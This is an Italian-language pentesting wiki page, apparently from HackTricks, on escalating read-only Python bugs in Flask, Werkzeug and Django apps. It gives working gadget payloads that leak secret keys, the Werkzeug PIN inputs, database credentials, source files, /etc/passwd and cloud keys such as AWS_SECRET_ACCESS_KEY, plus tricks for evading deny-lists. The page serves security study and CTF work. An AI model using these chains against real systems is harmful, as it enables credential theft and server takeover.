# Gadget di lettura interna di Python

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

Diverse vulnerabilità come [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) o [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) potrebbero permetterti di **leggere dati interni di Python, ma non di eseguire codice**. Pertanto, un pentester dovrà sfruttare al massimo questi permessi di lettura per **ottenere privilegi sensibili ed effettuare l'escalation della vulnerabilità**.

### Flask - Leggere la secret key

La pagina principale di un'applicazione Flask probabilmente conterrà l'oggetto globale **`app`**, in cui questa **secret è configurata**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
In questo caso è possibile accedere a questo oggetto usando qualsiasi gadget per **accedere agli oggetti globali** dalla [**pagina Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Nel caso in cui **la vulnerabilità si trovi in un file Python diverso**, è necessario un gadget per attraversare i file fino a raggiungere quello principale, così da **accedere all'oggetto globale `app.secret_key`** e poter [**escalate privileges** conoscendo questa chiave](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Un payload come questo [da questo writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Usa questo payload per **leggere `app.secret_key`**. Se il bug originale ti fornisce anche una primitiva di scrittura (ad esempio, class pollution), lo stesso percorso può essere usato per sostituirla e firmare cookie Flask con privilegi maggiori.

### Werkzeug - machine_id e node uuid

[**Usando questi payload da questo writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) potrai accedere a **machine_id** e al nodo **uuid**, ovvero i **dati privati** necessari per [**generare il pin di Werkzeug**](../../network-services-pentesting/pentesting-web/werkzeug.md) e accedere alla console Python in `/console` se la **debug mode è abilitata**:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Tieni presente che puoi ottenere il **percorso locale del server relativo ad `app.py`** generando qualche **errore** nella pagina web, che ti **fornirà il percorso**.

Se la vulnerabilità si trova in un file Python diverso, controlla il precedente trucco di Flask per accedere agli oggetti dal file Python principale.

### Django - SECRET_KEY e modulo settings

L'oggetto delle impostazioni di Django viene memorizzato nella cache di `sys.modules` una volta avviata l'applicazione. Con le sole primitive di lettura puoi fare leak di **`SECRET_KEY`**, chiavi di fallback, credenziali del database o salt di firma:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Se il gadget vulnerabile si trova in un altro modulo, analizza prima i globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` sono altrettanto preziose della `SECRET_KEY` corrente: continuano a validare i vecchi valori firmati durante la rotazione. Eseguite inoltre il leak di `SESSION_ENGINE` e `SESSION_SERIALIZER` per determinare rapidamente se l'impatto riguarda solo la falsificazione dei cookie o qualcosa di più potente. Per i dettagli sull'impatto web, consultate la [**pagina di pentesting di Django**](../../network-services-pentesting/pentesting-web/django.md).

### Gadget dei module loader - lettura del codice sorgente e dei file

I moduli Python caricati mantengono solitamente un `__loader__`. I loader basati su file espongono spesso `get_source()` e `get_data()`, che sono primitive perfette di **sola lettura** quando è già possibile raggiungere un oggetto modulo, ma non `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Questo è molto utile per eseguire il dump di **moduli di configurazione, blueprint, file helper o route nascoste** e recuperare chiavi API, DSN, percorsi delle flag o ulteriori entry point per i gadget.

Se disponi solo dell'enumerazione delle subclass, cerca il loader per nome invece di codificare un indice:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals del frame di generator / coroutine

Se puoi creare o raggiungere un oggetto generator/coroutine, il suo frame può esporre i globals **senza richiedere alcun gadget `__globals__` di funzione**. Questo è utile contro i filtri che bloccano solo i nomi dunder e ignorano gli attributi del frame come `gi_frame`, `ag_frame`, `cr_frame` o `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Una volta ottenuti i globals del frame, continua esattamente come negli altri gadget (`sys.modules`, oggetti di configurazione, `os.environ`, ecc.). I recenti sandbox escape continuano a riscoprire questa tecnica perché `gi_frame` e `f_globals` non sono attributi dunder e spesso sopravvivono a semplici deny-list.

### Variabili d'ambiente / credenziali cloud tramite moduli caricati

Molti jail importano ancora `os` o `sys` in qualche punto. Puoi abusare di qualsiasi funzione raggiungibile `__init__.__globals__` per fare pivot verso il modulo `os` già importato ed estrarre le **variabili d'ambiente** contenenti API token, chiavi cloud o flag:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Se l'indice della sottoclasse è filtrato, usa i loader:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Le variabili d'ambiente sono frequentemente gli unici secret necessari per passare dalla lettura alla compromissione completa (cloud IAM keys, database URLs, signing keys, ecc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) consentiva la **class pollution** tramite richieste component appositamente create. Impostare un property path come `__init__.__globals__` permetteva a un attacker di raggiungere i globali del modulo del componente e qualsiasi modulo importato (ad esempio `settings`, `os`, `sys`). Da lì è possibile fare leak di `SECRET_KEY`, `DATABASES` o delle credenziali dei servizi senza code execution. La exploit chain è basata esclusivamente sulla lettura e utilizza gli stessi pattern di dunder-gadget descritti sopra.

### Gadget collections per il chaining

CTF recenti e la ricerca sui pyjail mostrano affidabili read chain costruite utilizzando solo l'accesso agli attributi e l'enumerazione delle sottoclassi. Liste mantenute dalla community, come [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), catalogano centinaia di gadget minimali che è possibile combinare per attraversare gli oggetti fino a `__globals__`, `sys.modules` e infine ai dati sensibili. È preferibile usare ricerche basate su attributi/nomi invece di raw subclass indexes, perché la posizione di `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, ecc. cambia tra le versioni di Python e in presenza di librerie importate aggiuntive.

## Riferimenti

- [Documentazione Django sulla firma crittografica](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [pyjailbreaker – wiki sui gadget per Python sandbox](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
